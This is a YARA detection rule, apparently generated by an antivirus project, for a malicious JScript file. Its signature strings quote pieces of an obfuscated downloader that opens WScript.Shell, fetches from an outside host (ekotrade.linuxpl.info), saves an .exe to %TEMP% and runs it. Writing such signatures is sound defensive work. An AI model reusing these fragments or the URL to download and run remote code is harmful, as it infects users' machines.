rule sig_20160401_33cad91d012227f513b27de78aae1462 {
  meta:
    description = "datamaliciousorder - file 20160401_33cad91d012227f513b27de78aae1462.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6b6fc71bfb484317971c026e8d72caebce847dee17064684418f92f19d1e35f6"

  strings:
    $s1  = "function OegQy(PivHyw, FqmPt){SwvNh = SwvNh * 1; return PivHyw - FqmPt;};" fullword ascii
    $s2  = "var TddDht = function JnLu() {return WScript[EwxPm](\"WScript\"+\".Shell\");}(), CuGoe = 11;" fullword ascii
    $s3  = "if (KpHvm[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "KpHvm[OyMx](\"G\" + \"ET\", \"http://ekotrade.linuxpl.info/b6dsa\", false);" fullword ascii
    $s5  = "function WwTjt(){return OzpRu + \"\";};" fullword ascii
    $s6  = "function SwOgv() {return TddDht[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"PrIB8VEqlL.ex\" + \"e\";};" fullword ascii
    $s7  = "function BwMq() {return ((QwtBz == true) && (QwtBz == EkvIc)) ? 1 : SwvNh;};" fullword ascii
    $s8  = "var IirWn = false;" fullword ascii
    $s9  = "function TmXa(JgpWnv){TddDht[\"R\"+\"un\"](JgpWnv, SwvNh, SwvNh);};" fullword ascii
    $s10 = "QwtBz = true; " fullword ascii
    $s11 = "var QwtBz = false;" fullword ascii
    $s12 = "}while (XyeZg);" fullword ascii
    $s13 = "function NeoOqz(){return EwxPm;};" fullword ascii
    $s14 = "var YzMj = new this[\"Date\"]();" fullword ascii
    $s15 = "function TawGtt(RbAp) {var TsTx = (1, 2, 3, 4, 5, RbAp); return TsTx;};" fullword ascii
    $s16 = "function KctVq(){return 23;};" fullword ascii
    $s17 = "return OegQy(JqPh, WuKex);" fullword ascii
    $s18 = "function ByBy()" fullword ascii
    $s19 = "EkvIc = true; " fullword ascii
    $s20 = "var EkvIc = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}